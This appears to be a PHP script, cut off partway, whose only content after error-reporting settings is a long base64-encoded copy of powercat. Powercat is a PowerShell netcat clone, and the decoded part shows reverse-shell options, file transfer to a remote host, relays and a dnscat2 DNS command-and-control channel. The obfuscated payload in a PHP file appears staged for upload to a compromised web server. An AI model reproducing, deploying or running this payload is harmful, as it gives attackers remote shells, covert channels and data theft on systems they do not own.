<?php 
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$powercatb64encoded = 'ZnVuY3Rpb24gcG93ZXJjYXQKewogIHBhcmFtKAogICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjPSIiLAogICAgW2FsaWFzKCJMaXN0ZW4iKV1bc3dpdGNoXSRsPSRGYWxzZSwKICAgIFthbGlhcygiUG9ydCIpXVtQYXJhbWV0ZXIoUG9zaXRpb249LTEpXVtzdHJpbmddJHA9IiIsCiAgICBbYWxpYXMoIkV4ZWN1dGUiKV1bc3RyaW5nXSRlPSIiLAogICAgW2FsaWFzKCJFeGVjdXRlUG93ZXJzaGVsbCIpXVtzd2l0Y2hdJGVwPSRGYWxzZSwKICAgIFthbGlhcygiUmVsYXkiKV1bc3RyaW5nXSRyPSIiLAogICAgW2FsaWFzKCJVRFAiKV1bc3dpdGNoXSR1PSRGYWxzZSwKICAgIFthbGlhcygiZG5zY2F0MiIpXVtzdHJpbmddJGRucz0iIiwKICAgIFthbGlhcygiRE5TRmFpbHVyZVRocmVzaG9sZCIpXVtpbnQzMl0kZG5zZnQ9MTAsCiAgICBbYWxpYXMoIlRpbWVvdXQiKV1baW50MzJdJHQ9NjAsCiAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lPSRUcnVlKV1bYWxpYXMoIklucHV0IildJGk9JG51bGwsCiAgICBbVmFsaWRhdGVTZXQoJ0hvc3QnLCAnQnl0ZXMnLCAnU3RyaW5nJyldW2FsaWFzKCJPdXRwdXRUeXBlIildW3N0cmluZ10kbz0iSG9zdCIsCiAgICBbYWxpYXMoIk91dHB1dEZpbGUiKV1bc3RyaW5nXSRvZj0iIiwKICAgIFthbGlhcygiRGlzY29ubmVjdCIpXVtzd2l0Y2hdJGQ9JEZhbHNlLAogICAgW2FsaWFzKCJSZXBlYXRlciIpXVtzd2l0Y2hdJHJlcD0kRmFsc2UsCiAgICBbYWxpYXMoIkdlbmVyYXRlUGF5bG9hZCIpXVtzd2l0Y2hdJGc9JEZhbHNlLAogICAgW2FsaWFzKCJHZW5lcmF0ZUVuY29kZWQiKV1bc3dpdGNoXSRnZT0kRmFsc2UsCiAgICBbYWxpYXMoIkhlbHAiKV1bc3dpdGNoXSRoPSRGYWxzZQogICkKCiAgIyMjIyMjIyMjIyMjIyMjIEhFTFAgIyMjIyMjIyMjIyMjIyMjCiAgJEhlbHAgPSAiCnBvd2VyY2F0IC0gTmV0Y2F0LCBUaGUgUG93ZXJzaGVsbCBWZXJzaW9uCkdpdGh1YiBSZXBvc2l0b3J5OiBodHRwczovL2dpdGh1Yi5jb20vYmVzaW1vcmhpbm8vcG93ZXJjYXQKClRoaXMgc2NyaXB0IGF0dGVtcHRzIHRvIGltcGxlbWVudCB0aGUgZmVhdHVyZXMgb2YgbmV0Y2F0IGluIGEgcG93ZXJzaGVsbApzY3JpcHQuIEl0IGFsc28gY29udGFpbnMgZXh0cmEgZmVhdHVyZXMgc3VjaCBhcyBidWlsdC1pbiByZWxheXMsIGV4ZWN1dGUKcG93ZXJzaGVsbCwgYW5kIGEgZG5zY2F0MiBjbGllbnQuCgpVc2FnZTogcG93ZXJjYXQgWy1jIG9yIC1sXSBbLXAgcG9ydF0gW29wdGlvbnNdCgogIC1jICA8aXA+ICAgICAgICBDbGllbnQgTW9kZS4gUHJvdmlkZSB0aGUgSVAgb2YgdGhlIHN5c3RlbSB5b3Ugd2lzaCB0byBjb25uZWN0IHRvLgogICAgICAgICAgICAgICAgICBJZiB5b3UgYXJlIHVzaW5nIC1kbnMsIHNwZWNpZnkgdGhlIEROUyBTZXJ2ZXIgdG8gc2VuZCBxdWVyaWVzIHRvLgoKICAtbCAgICAgICAgICAgICAgTGlzdGVuIE1vZGUuIFN0YXJ0IGEgbGlzdGVuZXIgb24gdGhlIHBvcnQgc3BlY2lmaWVkIGJ5IC1wLgoKICAtcCAgPHBvcnQ+ICAgICAgUG9ydC4gVGhlIHBvcnQgdG8gY29ubmVjdCB0bywgb3IgdGhlIHBvcnQgdG8gbGlzdGVuIG9uLgoKICAtZSAgPHByb2M+ICAgICAgRXhlY3V0ZS4gU3BlY2lmeSB0aGUgbmFtZSBvZiB0aGUgcHJvY2VzcyB0byBzdGFydC4KCiAgLWVwICAgICAgICAgICAgIEV4ZWN1dGUgUG93ZXJzaGVsbC4gU3RhcnQgYSBwc2V1ZG8gcG93ZXJzaGVsbCBzZXNzaW9uLiBZb3UgY2FuCiAgICAgICAgICAgICAgICAgIGRlY2xhcmUgdmFyaWFibGVzIGFuZCBleGVjdXRlIGNvbW1hbmRzLCBidXQgaWYgeW91IHRyeSB0byBlbnRlcgogICAgICAgICAgICAgICAgICBhbm90aGVyIHNoZWxsIChuc2xvb2t1cCwgbmV0c2gsIGNtZCwgZXRjLikgdGhlIHNoZWxsIHdpbGwgaGFuZy4KCiAgLXIgIDxzdHI+ICAgICAgIFJlbGF5LiBVc2VkIGZvciByZWxheWluZyBuZXR3b3JrIHRyYWZmaWMgYmV0d2VlbiB0d28gbm9kZXMuCiAgICAgICAgICAgICAgICAgIENsaWVudCBSZWxheSBGb3JtYXQ6ICAgLXIgPHByb3RvY29sPjo8aXAgYWRkcj46PHBvcnQ+CiAgICAgICAgICAgICAgICAgIExpc3RlbmVyIFJlbGF5IEZvcm1hdDogLXIgPHByb3RvY29sPjo8cG9ydD4KICAgICAgICAgICAgICAgICAgRE5TQ2F0MiBSZWxheSBGb3JtYXQ6ICAtciBkbnM6PGRucyBzZXJ2ZXI+OjxkbnMgcG9ydD46PGRvbWFpbj4KCiAgLXUgICAgICAgICAgICAgIFVEUCBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciBVRFAuIEJlY2F1c2UgaXQncyBVRFAsIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgICAgbXVzdCBzZW5kIGRhdGEgYmVmb3JlIHRoZSBzZXJ2ZXIgY2FuIHJlc3BvbmQuCgogIC1kbnMgIDxkb21haW4+ICBETlMgTW9kZS4gU2VuZCB0cmFmZmljIG92ZXIgdGhlIGRuc2NhdDIgZG5zIGNvdmVydCBjaGFubmVsLgogICAgICAgICAgICAgICAgICBTcGVjaWZ5IHRoZSBkbnMgc2VydmVyIHRvIC1jLCB0aGUgZG5zIHBvcnQgdG8gLXAsIGFuZCBzcGVjaWZ5IHRoZQogICAgICAgICAgICAgICAgICBkb21haW4gdG8gdGhpcyBvcHRpb24sIC1kbnMuIFRoaXMgaXMgb25seSBhIGNsaWVudC4KICAgICAgICAgICAgICAgICAgR2V0IHRoZSBzZXJ2ZXIgaGVyZTogaHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0MgoKICAtZG5zZnQgPGludD4gICAgRE5TIEZhaWx1cmUgVGhyZXNob2xkLiBUaGlzIGlzIGhvdyBtYW55IGJhZCBwYWNrZXRzIHRoZSBjbGllbnQgY2FuCiAgICAgICAgICAgICAgICAgIHJlY2lldmUgYmVmb3JlIGV4aXRpbmcuIFNldCB0byB6ZXJvIHdoZW4gcmVjZWl2aW5nIGZpbGVzLCBhbmQgc2V0IGhpZ2gKICAgICAgICAgICAgICAgICAgZm9yIG1vcmUgc3RhYmlsaXR5IG92ZXIgdGhlIGludGVybmV0LgoKICAtdCAgPGludD4gICAgICAgVGltZW91dC4gVGhlIG51bWJlciBvZiBzZWNvbmRzIHRvIHdhaXQgYmVmb3JlIGdpdmluZyB1cCBvbiBsaXN0ZW5pbmcgb3IKICAgICAgICAgICAgICAgICAgY29ubmVjdGluZy4gRGVmYXVsdDogNjAKCiAgLWkgIDxpbnB1dD4gICAgIElucHV0LiBQcm92aWRlIGRhdGEgdG8gYmUgc2VudCBkb3duIHRoZSBwaXBlIGFzIHNvb24gYXMgYSBjb25uZWN0aW9uIGlzCiAgICAgICAgICAgICAgICAgIGVzdGFibGlzaGVkLiBVc2VkIGZvciBtb3ZpbmcgZmlsZXMuIFlvdSBjYW4gcHJvdmlkZSB0aGUgcGF0aCB0byBhIGZpbGUsCiAgICAgICAgICAgICAgICAgIGEgYnl0ZSBhcnJheSBvYmplY3QsIG9yIGEgc3RyaW5nLiBZb3UgY2FuIGFsc28gcGlwZSBhbnkgb2YgdGhvc2UgaW50bwogICAgICAgICAgICAgICAgICBwb3dlcmNhdCwgbGlrZSAnYWFhYWFhJyB8IHBvd2VyY2F0IC1jIDEwLjEuMS4xIC1wIDgwCgogIC1vICA8dHlwZT4gICAgICBPdXRwdXQuIFNwZWNpZnkgaG93IHBvd2VyY2F0IHNob3VsZCByZXR1cm4gaW5mb3JtYXRpb24gdG8gdGhlIGNvbnNvbGUuCiAgICAgICAgICAgICAgICAgIFZhbGlkIG9wdGlvbnMgYXJlICdCeXRlcycsICdTdHJpbmcnLCBvciAnSG9zdCcuIERlZmF1bHQgaXMgJ0hvc3QnLgoKICAtb2YgPHBhdGg+ICAgICAgT3V0cHV0IEZpbGUuICBTcGVjaWZ5IHRoZSBwYXRoIHRvIGEgZmlsZSB0byB3cml0ZSBvdXRwdXQgdG8uCgogIC1kICAgICAgICAgICAgICBEaXNjb25uZWN0LiBwb3dlcmNhdCB3aWxsIGRpc2Nvbm5lY3QgYWZ0ZXIgdGhlIGNvbm5lY3Rpb24gaXMgZXN0YWJsaXNoZWQKICAgICAgICAgICAgICAgICAgYW5kIHRoZSBpbnB1dCBmcm9tIC1pIGlzIHNlbnQuIFVzZWQgZm9yIHNjYW5uaW5nLgoKICAtcmVwICAgICAgICAgICAgUmVwZWF0ZXIuIHBvd2VyY2F0IHdpbGwgY29udGludWFsbHkgcmVzdGFydCBhZnRlciBpdCBpcyBkaXNjb25uZWN0ZWQuCiAgICAgICAgICAgICAgICAgIFVzZWQgZm9yIHNldHRpbmcgdXAgYSBwZXJzaXN0ZW50IHNlcnZlci4KCiAgLWcgICAgICAgICAgICAgIEdlbmVyYXRlIFBheWxvYWQuICBSZXR1cm5zIGEgc2NyaXB0IGFzIGEgc3RyaW5nIHdoaWNoIHdpbGwgZXhlY3V0ZSB0aGUKICAgICAgICAgICAgICAgICAgcG93ZXJjYXQgd2l0aCB0aGUgb3B0aW9ucyB5b3UgaGF2ZSBzcGVjaWZpZWQuIC1pLCAtZCwgYW5kIC1yZXAgd2lsbCBub3QKICAgICAgICAgICAgICAgICAgYmUgaW5jb3Jwb3JhdGVkLgoKICAtZ2UgICAgICAgICAgICAgR2VuZXJhdGUgRW5jb2RlZCBQYXlsb2FkLiBEb2VzIHRoZSBzYW1lIGFzIC1nLCBidXQgcmV0dXJucyBhIHN0cmluZyB3aGljaAogICAgICAgICAgICAgICAgICBjYW4gYmUgZXhlY3V0ZWQgaW4gdGhpcyB3YXk6IHBvd2Vyc2hlbGwgLUUgPGVuY29kZWQgc3RyaW5nPgoKICAtaCAgICAgICAgICAgICAgUHJpbnQgdGhpcyBoZWxwIG1lc3NhZ2UuCgpFeGFtcGxlczoKCiAgTGlzdGVuIG9uIHBvcnQgODAwMCBhbmQgcHJpbnQgdGhlIG91dHB1dCB0byB0aGUgY29uc29sZS4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMAoKICBDb25uZWN0IHRvIDEwLjEuMS4xIHBvcnQgNDQzLCBzZW5kIGEgc2hlbGwsIGFuZCBlbmFibGUgdmVyYm9zaXR5LgogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA0NDMgLWUgY21kIC12CgogIENvbm5lY3QgdG8gdGhlIGRuc2NhdDIgc2VydmVyIG9uIGMyLmV4YW1wbGUuY29tLCBhbmQgc2VuZCBkbnMgcXVlcmllcwogIHRvIHRoZSBkbnMgc2VydmVyIG9uIDEwLjEuMS4xIHBvcnQgNTMuCiAgICAgIHBvd2VyY2F0IC1jIDEwLjEuMS4xIC1wIDUzIC1kbnMgYzIuZXhhbXBsZS5jb20KCiAgU2VuZCBhIGZpbGUgdG8gMTAuMS4xLjE1IHBvcnQgODAwMC4KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjE1IC1wIDgwMDAgLWkgQzpcaW5wdXRmaWxlCgogIFdyaXRlIHRoZSBkYXRhIHNlbnQgdG8gdGhlIGxvY2FsIGxpc3RlbmVyIG9uIHBvcnQgNDQ0NCB0byBDOlxvdXRmaWxlCiAgICAgIHBvd2VyY2F0IC1sIC1wIDQ0NDQgLW9mIEM6XG91dGZpbGUKCiAgTGlzdGVuIG9uIHBvcnQgODAwMCBhbmQgcmVwZWF0ZWRseSBzZXJ2ZXIgYSBwb3dlcnNoZWxsIHNoZWxsLgogICAgICBwb3dlcmNhdCAtbCAtcCA4MDAwIC1lcCAtcmVwCgogIFJlbGF5IHRyYWZmaWMgY29taW5nIGluIG9uIHBvcnQgODAwMCBvdmVyIHRjcCB0byBwb3J0IDkwMDAgb24gMTAuMS4xLjEgb3ZlciB0Y3AuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgdGNwOjEwLjEuMS4xOjkwMDAKCiAgUmVsYXkgdHJhZmZpYyBjb21pbmcgaW4gb24gcG9ydCA4MDAwIG92ZXIgdGNwIHRvIHRoZSBkbnNjYXQyIHNlcnZlciBvbiBjMi5leGFtcGxlLmNvbSwKICBzZW5kaW5nIHF1ZXJpZXMgdG8gMTAuMS4xLjEgcG9ydCA1My4KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtciBkbnM6MTAuMS4xLjE6NTM6YzIuZXhhbXBsZS5jb20KIgogIGlmKCRoKXtyZXR1cm4gJEhlbHB9CiAgIyMjIyMjIyMjIyMjIyMjIEhFTFAgIyMjIyMjIyMjIyMjIyMjCgogICMjIyMjIyMjIyMjIyMjIyBWQUxJREFURSBBUkdTICMjIyMjIyMjIyMjIyMjIwogICRnbG9iYWw6VmVyYm9zZSA9ICRWZXJib3NlCiAgaWYoJG9mIC1uZSAnJyl7JG8gPSAnQnl0ZXMnfQogIGlmKCRkbnMgLWVxICIiKQogIHsKICAgIGlmKCgoJGMgLWVxICIiKSAtYW5kICghJGwpKSAtb3IgKCgkYyAtbmUgIiIpIC1hbmQgJGwpKXtyZXR1cm4gIllvdSBtdXN0IHNlbGVjdCBlaXRoZXIgY2xpZW50IG1vZGUgKC1jKSBvciBsaXN0ZW4gbW9kZSAoLWwpLiJ9CiAgICBpZigkcCAtZXEgIiIpe3JldHVybiAiUGxlYXNlIHByb3ZpZGUgYSBwb3J0IG51bWJlciB0byAtcC4ifQogIH0KICBpZigoKCgkciAtbmUgIiIpIC1hbmQgKCRlIC1uZSAiIikpIC1vciAoKCRlIC1uZSAiIikgLWFuZCAoJGVwKSkpIC1vciAgKCgkciAtbmUgIiIpIC1hbmQgKCRlcCkpKXtyZXR1cm4gIllvdSBjYW4gb25seSBwaWNrIG9uZSBvZiB0aGVzZTogLWUsIC1lcCwgLXIifQogIGlmKCgkaSAtbmUgJG51bGwpIC1hbmQgKCgkciAtbmUgIiIpIC1vciAoJGUgLW5lICIiKSkpe3JldHVybiAiLWkgaXMgbm90IGFwcGxpY2FibGUgaGVyZS4ifQogIGlmKCRsKQogIHsKICAgICRGYWlsdXJlID0gJEZhbHNlCiAgICBuZXRzdGF0IC1uYSB8IFNlbGVjdC1TdHJpbmcgTElTVEVOSU5HIHwgJSB7aWYoKCRfLlRvU3RyaW5nKCkuc3BsaXQoIjoiKVsxXS5zcGxpdCgiICIpWzBdKSAtZXEgJHApe1dyaXRlLU91dHB1dCAoIlRoZSBzZWxlY3RlZCBwb3J0ICIgKyAkcCArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19CiAgICBpZigkRmFpbHVyZSl7YnJlYWt9CiAgfQogIGlmKCRyIC1uZSAiIikKICB7CiAgICBpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKQogICAgewogICAgICAkRmFpbHVyZSA9ICRGYWxzZQogICAgICBuZXRzdGF0IC1uYSB8IFNlbGVjdC1TdHJpbmcgTElTVEVOSU5HIHwgJSB7aWYoKCRfLlRvU3RyaW5nKCkuc3BsaXQoIjoiKVsxXS5zcGxpdCgiICIpWzBdKSAtZXEgJHIuc3BsaXQoIjoiKVsxXSl7V3JpdGUtT3V0cHV0ICgiVGhlIHNlbGVjdGVkIHBvcnQgIiArICRyLnNwbGl0KCI6IilbMV0gKyAiIGlzIGFscmVhZHkgaW4gdXNlLiIpIDsgJEZhaWx1cmU9JFRydWV9fQogICAgICBpZigkRmFpbHVyZSl7YnJlYWt9CiAgICB9CiAgfQogICMjIyMjIyMjIyMjIyMjIyBWQUxJREFURSBBUkdTICMjIyMjIyMjIyMjIyMjIwoKICAjIyMjIyMjIyMjIyMjIyMgVURQIEZVTkNUSU9OUyAjIyMjIyMjIyMjIyMjIyMKICBmdW5jdGlvbiBTZXR1cF9VRFAKICB7CiAgICBwYXJhbSgkRnVuY1NldHVwVmFycykKICAgIGlmKCRnbG9iYWw6VmVyYm9zZSl7JFZlcmJvc2UgPSAkVHJ1ZX0KICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMKICAgICRGdW5jVmFycyA9IEB7fQogICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICBpZigkbCkKICAgIHsKICAgICAgJFNvY2tldERlc3RpbmF0aW9uQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDY1NTM2CiAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpBbnkpLCAkcAogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVURQQ2xpZW50ICRwCiAgICAgICRQYWNrZXRJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuSVBQYWNrZXRJbmZvcm1hdGlvbgogICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSBwb3J0ICIgKyAkcCArICIgW3VkcF0iKQogICAgICAkQ29ubmVjdEhhbmRsZSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZU1lc3NhZ2VGcm9tKCRTb2NrZXREZXN0aW5hdGlvbkJ1ZmZlciwwLDY1NTM2LFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lLFtyZWZdJEVuZFBvaW50LCRudWxsLCRudWxsKQogICAgICAkU3RvcHdhdGNoID0gW1N5c3RlbS5EaWFnbm9zdGljcy5TdG9wd2F0Y2hdOjpTdGFydE5ldygpCiAgICAgIHdoaWxlKCRUcnVlKQogICAgICB7CiAgICAgICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQogICAgICAgIHsKICAgICAgICAgIGlmKEAoMTcsMjcpIC1jb250YWlucyAoJEhvc3QuVUkuUmF3VUkuUmVhZEtleSgiTm9FY2hvLEluY2x1ZGVLZXlEb3duLEluY2x1ZGVLZXlVcCIpLlZpcnR1YWxLZXlDb2RlKSkKICAgICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ1RSTCBvciBFU0MgY2F1Z2h0LiBTdG9wcGluZyBVRFAgU2V0dXAuLi4iCiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQogICAgICAgICAgICAkU3RvcHdhdGNoLlN0b3AoKQogICAgICAgICAgICBicmVhawogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZigkU3RvcHdhdGNoLkVsYXBzZWQuVG90YWxTZWNvbmRzIC1ndCAkdCkKICAgICAgICB7CiAgICAgICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCkKICAgICAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhawogICAgICAgIH0KICAgICAgICBpZigkQ29ubmVjdEhhbmRsZS5Jc0NvbXBsZXRlZCkKICAgICAgICB7CiAgICAgICAgICAkU29ja2V0Qnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZU1lc3NhZ2VGcm9tKCRDb25uZWN0SGFuZGxlLFtyZWZdKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRFbmRQb2ludCxbcmVmXSRQYWNrZXRJbmZvKQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAoIkNvbm5lY3Rpb24gZnJvbSBbIiArICRFbmRQb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nICsgIl0gcG9ydCAiICsgJHAgKyAiIFt1ZHBdIGFjY2VwdGVkIChzb3VyY2UgcG9ydCAiICsgJEVuZFBvaW50LlBvcnQgKyAiKSIpCiAgICAgICAgICBpZigkU29ja2V0Qnl0ZXNSZWFkIC1ndCAwKXticmVha30KICAgICAgICAgIGVsc2V7YnJlYWt9CiAgICAgICAgfQogICAgICB9CiAgICAgICRTdG9wd2F0Y2guU3RvcCgpCiAgICAgICRGdW5jVmFyc1siSW5pdGlhbENvbm5lY3Rpb25CeXRlcyJdID0gJFNvY2tldERlc3RpbmF0aW9uQnVmZmVyWzAuLihbaW50XSRTb2NrZXRCeXRlc1JlYWQtMSldCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgIGlmKCEkYy5Db250YWlucygiLiIpKQogICAgICB7CiAgICAgICAgJElQTGlzdCA9IEAoKQogICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAleyRJUExpc3QgKz0gJF8uSVBBZGRyZXNzVG9TdHJpbmd9CiAgICAgICAgV3JpdGUtVmVyYm9zZSAoIk5hbWUgIiArICRjICsgIiByZXNvbHZlZCB0byBhZGRyZXNzICIgKyAkSVBMaXN0WzBdKQogICAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpQYXJzZSgkSVBMaXN0WzBdKSksICRwCiAgICAgIH0KICAgICAgZWxzZQogICAgICB7CiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRjKSksICRwCiAgICAgIH0KICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudAogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNvbm5lY3QoJGMsJHApCiAgICAgIFdyaXRlLVZlcmJvc2UgKCJTZW5kaW5nIFVEUCB0cmFmZmljIHRvICIgKyAkYyArICIgcG9ydCAiICsgJHAgKyAiLi4uIikKICAgICAgV3JpdGUtVmVyYm9zZSAoIlVEUDogTWFrZSBzdXJlIHRvIHNlbmQgc29tZSBkYXRhIHNvIHRoZSBzZXJ2ZXIgY2FuIG5vdGljZSB5b3UhIikKICAgIH0KICAgICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdID0gNjU1MzYKICAgICRGdW5jVmFyc1siRW5kUG9pbnQiXSA9ICRFbmRQb2ludAogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdCiAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLDAsJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwkbnVsbCwkbnVsbCkKICAgIHJldHVybiAkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gUmVhZERhdGFfVURQCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgJERhdGEgPSAkbnVsbAogICAgaWYoJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpCiAgICB7CiAgICAgICRTdHJlYW1CeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5FbmRSZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSkKICAgICAgaWYoJFN0cmVhbUJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9CiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdHJlYW1CeXRlc1JlYWQtMSldCiAgICAgICRGdW5jVmFyc1siU3RyZWFtUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuQmVnaW5SZWNlaXZlRnJvbSgkRnVuY1ZhcnNbIlN0cmVhbURlc3RpbmF0aW9uQnVmZmVyIl0sMCwkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSwoW1N5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXRGbGFnc106Ok5vbmUpLFtyZWZdJEZ1bmNWYXJzWyJFbmRQb2ludCJdLCRudWxsLCRudWxsKQogICAgfQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBXcml0ZURhdGFfVURQCiAgewogICAgcGFyYW0oJERhdGEsJEZ1bmNWYXJzKQogICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuU2VuZFRvKCREYXRhLCRGdW5jVmFyc1siRW5kUG9pbnQiXSkgfCBPdXQtTnVsbAogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBDbG9zZV9VRFAKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsb3NlKCkKICB9CiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjCgogICMjIyMjIyMjIyMjIyMjIyBETlMgRlVOQ1RJT05TICMjIyMjIyMjIyMjIyMjIwogIGZ1bmN0aW9uIFNldHVwX0ROUwogIHsKICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQogICAgZnVuY3Rpb24gQ29udmVydFRvLUhleEFycmF5CiAgICB7CiAgICAgIHBhcmFtKCRTdHJpbmcpCiAgICAgICRIZXggPSBAKCkKICAgICAgJFN0cmluZy5Ub0NoYXJBcnJheSgpIHwgJSB7InswOnh9IiAtZiBbYnl0ZV0kX30gfCAlIHtpZigkXy5MZW5ndGggLWVxIDEpeyIwIiArIFtzdHJpbmddJF99IGVsc2V7W3N0cmluZ10kX319IHwgJSB7JEhleCArPSAkX30KICAgICAgcmV0dXJuICRIZXgKICAgIH0KCiAgICBmdW5jdGlvbiBTZW5kUGFja2V0CiAgICB7CiAgICAgIHBhcmFtKCRQYWNrZXQsJEROU1NlcnZlciwkRE5TUG9ydCkKICAgICAgJENvbW1hbmQgPSAoInNldCB0eXBlPVRYVGBuc2VydmVyICRETlNTZXJ2ZXJgbnNldCBwb3J0PSRETlNQb3J0YG5zZXQgZG9tYWluPS5jb21gbnNldCByZXRyeT0xYG4iICsgJFBhY2tldCArICJgbmV4aXQiKQogICAgICAkcmVzdWx0ID0gKCRDb21tYW5kIHwgbnNsb29rdXAgMj4mMSB8IE91dC1TdHJpbmcpCiAgICAgIGlmKCRyZXN1bHQuQ29udGFpbnMoJyInKSl7cmV0dXJuIChbcmVnZXhdOjpNYXRjaCgkcmVzdWx0LnJlcGxhY2UoImJpbz0iLCIiKSwnKD88PSIpW14iXSooPz0iKScpLlZhbHVlKX0KICAgICAgZWxzZXtyZXR1cm4gMX0KICAgIH0KCiAgICBmdW5jdGlvbiBDcmVhdGVfU1lOCiAgICB7CiAgICAgIHBhcmFtKCRTZXNzaW9uSWQsJFNlcU51bSwkVGFnLCREb21haW4pCiAgICAgIHJldHVybiAoJFRhZyArIChbc3RyaW5nXShHZXQtUmFuZG9tIC1NYXhpbXVtIDk5OTkgLU1pbmltdW0gMTAwMCkpICsgIjAwIiArICRTZXNzaW9uSWQgKyAkU2VxTnVtICsgIjAwMDAiICsgJERvbWFpbikKICAgIH0KCiAgICBmdW5jdGlvbiBDcmVhdGVfRklOCiAgICB7CiAgICAgIHBhcmFtKCRTZXNzaW9uSWQsJFRhZywkRG9tYWluKQogICAgICByZXR1cm4gKCRUYWcgKyAoW3N0cmluZ10oR2V0LVJhbmRvbSAtTWF4aW11bSA5OTk5IC1NaW5pbXVtIDEwMDApKSArICIwMiIgKyAk